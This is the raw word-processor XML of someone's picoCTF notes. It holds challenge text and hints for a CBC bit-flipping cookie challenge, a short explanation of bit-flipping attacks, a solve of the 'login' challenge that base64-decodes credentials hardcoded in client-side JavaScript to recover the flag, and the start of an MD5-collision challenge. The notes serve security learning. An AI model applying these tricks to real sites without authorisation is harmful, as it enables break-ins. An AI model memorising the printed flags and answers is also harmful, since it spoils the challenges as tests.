          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve">e modified </w:t>
      </w:r>
      <w:r w:rsidRPr="006F0F0E">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>lient-side, so now I decided to encrypt them! </w:t>
      </w:r>
      <w:hyperlink r:id="rId104" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>http://mercury.picoctf.net:10868/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3AD1FCAE" w14:textId="78E7FF32"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736282F" w14:textId="4944908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Hints</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66684BC0" w14:textId="4BF8CA89" w:rsidR="00654264" w:rsidRDefault="00000000" w:rsidP="001C530B">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId105" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="00654264">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="none"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>https://en.wikipedia.org/wiki/Homomorphic_encryption</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="116FCC19" w14:textId="55F77FE4" w:rsidR="00654264" w:rsidRDefault="00654264"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search endpoint is only helpful for telling you if you are admin or not, you won't be able to guess the flag name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6085DE82" w14:textId="34AD194E"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CBC bit flipping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FB0A35E" w14:textId="66784BC6"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4FA189D" w14:textId="113A710B"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Cipher Block Chaining (CBC)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23A884CE" w14:textId="594D9ADA"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Block ciphers such as AES encrypt blocks of text at a time, rather than encrypting one bit at a time as in stream ciphers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FFFEA3C" w14:textId="4F11AE4C" w:rsidR="006F0F0E" w:rsidRDefault="006F0F0E"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In the Cipher Block Chaining (CBC) mode of operation, each plaintext block is XORed with the previous ciphertext block before being encrypted.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74586941" w14:textId="45DBB819"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2CB0049A" wp14:editId="77AD63E1">
            <wp:extent cx="5724525" cy="2305050"/>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6"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5724525" cy="2305050"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="19326AB4" w14:textId="3E344A24"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p>
    <w:p w14:paraId="770D1D3E" w14:textId="1F15BF3A"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474D2428" wp14:editId="7570E7CC">
            <wp:extent cx="4595258" cy="5524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5258" cy="5524979"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2055DC14" w14:textId="01E41C08" w:rsidR="0018076A" w:rsidRPr="006F0F0E" w:rsidRDefault="0018076A"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27141B6A" wp14:editId="496C6BB1">
            <wp:extent cx="4412362" cy="2796782"/>
            <wp:effectExtent l="0" t="0" r="7620"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08"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4412362" cy="2796782"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="636D4DE1" w14:textId="77777777"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048154ED" w14:textId="63C5C1EA"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lastRenderedPageBreak/>
        <w:t>arbitrarily change the value of the decoded plaintext in a CBC block cipher.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5426898B" w14:textId="634EC91A" w:rsidR="00654264"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The bit-flipping attack is a method of an attack which can change specific fields on ciphertext without decryption of the ciphertext [5]. The bit-flipping attack is feasible in specific encryption modes where a plaintext has same bit order with a ciphertext [3].</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E6B6B72" w14:textId="296FFC0E" w:rsidR="006F0F0E"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Stream ciphers, such as RC4, are vulnerable to a bit-flipping attack, as are some block cipher modes of operation. See stream cipher attack. A keyed message authentication code, digital signature, or other authentication mechanism allows the recipient to detect if any bits were flipped in transit.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35C0D730" w14:textId="77777777"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6211DDD" w14:textId="249B67C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sidRPr="00654264">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>ZzJwTW1SNTRNMFE5OGJ5NlZOU2o5NEo3U0U5VERzM0JzbEZ5WGlpaURVeUoyek9mMU1Wd1gyMFdsQXRVa0lqaWowSE0wRU15QXEvdzk0Wi9QNEIxcm5HYkJoM25FNi9ZYk1GUU5XRmpSZDNGREFRK2VQeGxoOHI3b1hjd0tCaGc=</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E41CD89" w14:textId="22C7D0F0" w:rsidR="001C530B" w:rsidRDefault="001C530B" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66A74467" w14:textId="39F80C9E" w:rsidR="001C530B" w:rsidRDefault="001C530B" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6BE46B84" w14:textId="77777777" w:rsidR="00233019" w:rsidRPr="00233019" w:rsidRDefault="00233019" w:rsidP="00233019">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00233019">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>login</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="795CD624" w14:textId="27D4A7DB" w:rsidR="00233019" w:rsidRPr="00233019" w:rsidRDefault="00233019" w:rsidP="00233019">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00233019">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> | 100 points</w:t>
      </w:r>
      <w:r w:rsidRPr="00233019">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> login</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34FDA702" w14:textId="79901724" w:rsidR="00233019" w:rsidRPr="00233019" w:rsidRDefault="00233019" w:rsidP="00233019">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01FCBB8A" w14:textId="77777777" w:rsidR="00233019" w:rsidRPr="00233019" w:rsidRDefault="00233019" w:rsidP="00233019">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00233019">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57B35F5E" w14:textId="77777777" w:rsidR="00233019" w:rsidRPr="00233019" w:rsidRDefault="00233019" w:rsidP="00233019">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00233019">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>AUTHOR: BROWNIEINMOTION</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="175E88DF" w14:textId="77777777" w:rsidR="00233019" w:rsidRPr="00233019" w:rsidRDefault="00233019" w:rsidP="00233019">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20B596D3" w14:textId="77777777" w:rsidR="00233019" w:rsidRPr="00233019" w:rsidRDefault="00233019" w:rsidP="00233019">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00233019">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7167DEE3" w14:textId="77777777" w:rsidR="00233019" w:rsidRPr="00233019" w:rsidRDefault="00233019" w:rsidP="00233019">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00233019">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>My dog-sitter's brother made this website but I can't get in; can you help?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C08E422" w14:textId="38DE9A2F" w:rsidR="001C530B" w:rsidRDefault="00233019" w:rsidP="00233019">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00233019">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>login.mars.picoctf.net</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F62F79C" w14:textId="177B8F6E" w:rsidR="001C530B" w:rsidRDefault="004C3213" w:rsidP="00233019">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>orce code</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42986390" w14:textId="7A6D1A0D" w:rsidR="00233019" w:rsidRDefault="00233019" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="468D70EA" wp14:editId="3B319527">
            <wp:extent cx="3360711" cy="2339543"/>
            <wp:effectExtent l="0" t="0" r="0" b="381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09"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3360711" cy="2339543"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="39DF03C4" w14:textId="30AF75F0" w:rsidR="00233019" w:rsidRDefault="004C3213" w:rsidP="004C3213">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>ndex.js</w:t>
      </w:r>
      <w:r w:rsidRPr="004C3213">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4A729D49" wp14:editId="56E38442">
            <wp:extent cx="6332220" cy="667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667385"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="60ED27CB" w14:textId="77777777" w:rsidR="004C3213" w:rsidRDefault="004C3213" w:rsidP="004C3213">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">opy index.js to vscode, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>ormat index.js  with -&gt;prettier</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="093B280E" wp14:editId="110C3ACD">
            <wp:extent cx="633222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2995295"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CA445D5" w14:textId="12DDC577" w:rsidR="004C3213" w:rsidRPr="004C3213" w:rsidRDefault="004C3213" w:rsidP="004C3213">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004C3213">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>We found username : YWRtaW4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7517F024" w14:textId="77777777" w:rsidR="004C3213" w:rsidRPr="004C3213" w:rsidRDefault="004C3213" w:rsidP="004C3213">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004C3213">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Password: cGljb0NURns1M3J2M3JfNTNydjNyXzUzcnYzcl81M3J2M3JfNTNydjNyfQ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D804204" w14:textId="2867EC58" w:rsidR="004C3213" w:rsidRDefault="004C3213" w:rsidP="004C3213">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>and the flag is the password.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E7C47D8" w14:textId="3833E2F1" w:rsidR="004C3213" w:rsidRDefault="004C3213" w:rsidP="004C3213">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>btoa() encode to base64</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B961170" w14:textId="7D284FA4" w:rsidR="004C3213" w:rsidRDefault="004C3213" w:rsidP="004C3213">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>atob() decode base64</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29D7FE20" w14:textId="5049FA47" w:rsidR="004C3213" w:rsidRDefault="000B5615" w:rsidP="004C3213">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>U</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">se atob() </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="613D2A94" w14:textId="27584CF9" w:rsidR="001C530B" w:rsidRDefault="000B5615" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="018DB2AB" wp14:editId="340C052A">
            <wp:extent cx="3665538" cy="6934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2"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3665538" cy="693480"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="715E3BE6" w14:textId="101B718B" w:rsidR="000B5615" w:rsidRDefault="00B7152D" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">$echo </w:t>
      </w:r>
      <w:r w:rsidRPr="00B7152D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>YWRtaW4 |base64 -d</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73EDC201" w14:textId="057840E5" w:rsidR="001C530B" w:rsidRDefault="00233019" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>user: admin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BF5030D" w14:textId="40DD50F9" w:rsidR="000B5615" w:rsidRDefault="000B5615" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>$ e</w:t>
      </w:r>
      <w:r w:rsidRPr="000B5615">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">cho cGljb0NURns1M3J2M3JfNTNydjNyXzUzcnYzcl81M3J2M3JfNTNydjNyfQ |base64 -d  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E1B905C" w14:textId="7B785D09" w:rsidR="001C530B" w:rsidRDefault="00233019" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">pw: </w:t>
      </w:r>
      <w:r w:rsidRPr="00233019">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF{53rv3r_53rv3r_53rv3r_53rv3r_53rv3r}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60FF0726" w14:textId="32C21FF0" w:rsidR="001C530B" w:rsidRDefault="001C530B" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2BB6F0FA" w14:textId="40ABF37E" w:rsidR="00721F7B" w:rsidRDefault="00721F7B" w:rsidP="00E114AB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0"/>
        <w:ind w:left="709"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t>It is my Birthday</w:t>
      </w:r>
      <w:r w:rsidR="00E114AB">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2447756C"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4707877"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49CA4AF7" w14:textId="77777777" w:rsidR="00721F7B" w:rsidRDefault="00721F7B" w:rsidP="00721F7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0AAC87C" w14:textId="77777777" w:rsidR="00721F7B" w:rsidRDefault="00721F7B" w:rsidP="00721F7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2DA2652" w14:textId="77777777" w:rsidR="00721F7B" w:rsidRDefault="00721F7B" w:rsidP="00721F7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 sent out 2 invitations to all of my friends for my birthday! I'll know if they get stolen because the two invites look similar, and they even have the same md5 hash, but they are slightly different! You wouldn't believe how long it took me to find a collision. Anyway, see if you're invited by submitting 2 PDFs to my website. </w:t>
      </w:r>
      <w:hyperlink r:id="rId113" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
